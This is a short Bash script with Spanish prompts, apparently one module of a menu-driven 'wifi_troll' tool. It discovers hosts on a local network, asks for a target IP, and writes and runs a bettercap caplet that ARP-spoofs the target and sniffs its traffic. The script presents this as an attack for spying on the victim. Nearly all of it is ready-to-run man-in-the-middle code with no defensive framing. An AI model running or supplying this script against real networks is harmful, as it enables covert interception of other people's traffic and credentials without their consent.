#!bin/bash

source requisitos/0.sh

Title
echo "[4] Espiar el Trafico de nuestra Red"
echo
read -p "[*] Escribe la Ip de Red (Ej: 192.168.1.0 o 192.168.0.0): " opc1
echo
sudo netdiscover -r $opc1/24 -P
echo
read -p "[*] Pon la IP del Objetivo (Ej: 192.168.1.1): " ip
read -p "[*] Pon la Interfaz de Red que estes utilizando (Ej: eth0): " interfaz
echo
cat > requisitos/4.2.cap << eof
net.probe on
sleep 8
set arp.spoof targets $ip
arp.spoof on
set net.sniff.verbose false
net.sniff on
eof
Title
echo "[#] Pulse Ctrl + c (Finalizar Ataque)"
echo
echo "========================================================================================="
echo "                      El Objetivo ($ip) esta siendo Sniffeado"
echo "========================================================================================="
echo
sudo bettercap -iface $interfaz -caplet requisitos/4.2.cap
echo
echo
echo "#####################"
echo "[1] Volver al Menu"
echo "[2] Volver a ejecutar"
echo "[3] Salir"
echo "#####################"
echo
read -p "Elige una opcion: " opc2
	case $opc2 in
			1 )	bash wifi_troll.sh
				;;
			2 )	bash requisitos/4.sh
				;;
			3 )	exit
				;;
			* )	echo
				echo "$RRPLY No es una opcion valida"
	esac
